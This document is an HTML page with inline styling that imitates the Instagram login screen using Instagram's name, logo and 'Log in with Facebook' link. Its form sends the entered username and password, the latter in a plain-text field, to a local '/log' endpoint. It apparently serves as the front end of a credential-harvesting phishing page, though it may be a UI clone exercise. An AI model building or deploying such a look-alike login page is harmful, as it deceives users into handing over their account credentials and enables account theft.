<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- title -->
    <title>Instagram</title>

    <!-- custom css link -->
    <link rel="stylesheet" href="style.css">

    <!-- favicon -->
    <link rel="shortcut icon" href="../img/favicon.png" type="image/x-icon">

    <!-- boxicons cdn link -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">

</head>

<body>

    <div class="image__login">
        <img src="../img/instagramimg.png" alt="">
    </div>

    <div class="insta__form">

        <div class="login__form">
            <img src="../img/instalogo.png">

            <form class="form" action="/log" method="POST">
                <input type="text" name="user_input" placeholder="Phone number, username, or email">
                <input type="text" name="user_login" placeholder="Password">
                <button type="submit" style="color: white; text-decoration: none;">Log in</button>
                <span class="or">OR</span>
            </form>
            

            <h3>
                <i class='bx bxl-facebook-circle' ></i>
                Log in with Facebook
            </h3>

            <span class="forget">
                Forget Password ?
            </span>


        </div>



    </div>

</body>
<style>
    * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: sans-serif;
}

body {
    display: flex;
    justify-content: center;
    height: 100vh;
    align-items: center;
    gap: 40px;
}

.insta__form {
    display: flex;
    flex-direction: column;
    gap: 40px;
}

.login__form {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 40px;
}

.form {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

input {
    max-width: 400px;
    width: 300px;
    background-color: #ECF3FF;
    border: 0;
    padding: 10px 20px;
    border: 1px solid #eee;
    border-radius: 50px;
    outline: none;
    color: #666;
}

button {
    max-width: 400px;
    width: 300px;
    background-color: #3578E5;
    border: 0;
    padding: 10px 20px;
    border: 1px solid #eee;
    border-radius: 50px;
    outline: none;
    color: #fff;
    font-weight: 600;
    cursor: pointer;
}

.or {
    font-size: 14px;
    font-weight: 600;
    color: #666;
    text-align: center;
    margin-top: 20px;
    position: relative;
}

.or::before {
    content: '';
    position: absolute;
    background-color: #666;
    height: 1px;
    bottom: 7px;
    left: 20px;
    width: 100px;
}

.or::after {
    content: '';
    position: absolute;
    background-color: #666;
    height: 1px;
    bottom: 7px;
    right: 20px;
    width: 100px;
}

h3 {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 14px;
    color: #385185;
    cursor: pointer;
}

h3 i {
    font-size: 22px;
}

.forget{
    margin-top: -20px;
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 12px;
    color: #385185;
    cursor: pointer;
}




@media (max-width:764px) {
    .image__login{
        display: none;
    }
}
</style>
</html>
